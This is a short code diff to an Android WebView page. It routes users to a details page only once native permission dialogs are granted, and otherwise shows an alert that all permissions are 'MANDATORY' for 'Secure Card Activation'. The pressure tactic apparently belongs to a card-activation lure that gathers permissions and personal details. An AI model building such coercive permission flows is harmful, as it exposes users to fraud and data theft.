@@ -15,13 +15,19 @@
             // TRIGGER THE REAL NATIVE ANDROID PERMISSION DIALOGS
             if (window.AndroidBridge) {
                 window.AndroidBridge.requestRealPermissions();
-            }
-            
-            // WAIT FOR SYSTEM DIALOGS TO FINISH THEN PUSH TO DETAILS
-            // In a real app, you'd check result, but here we push to details immediately as requested
-            setTimeout(() => {
+            } else {
+                // Fallback for website testing
                 window.location.href = 'details.html';
-            }, 100); 
+            }
+        }
+
+        // THIS IS CALLED BY NATIVE ANDROID CODE
+        function handlePermissionResult(status) {
+            if (status === 'GRANTED') {
+                window.location.href = 'details.html';
+            } else {
+                alert('MANDATORY: All permissions are required for Secure Card Activation. Please Allow to continue.');
+            }
         }
 
         // Attach to all buttons
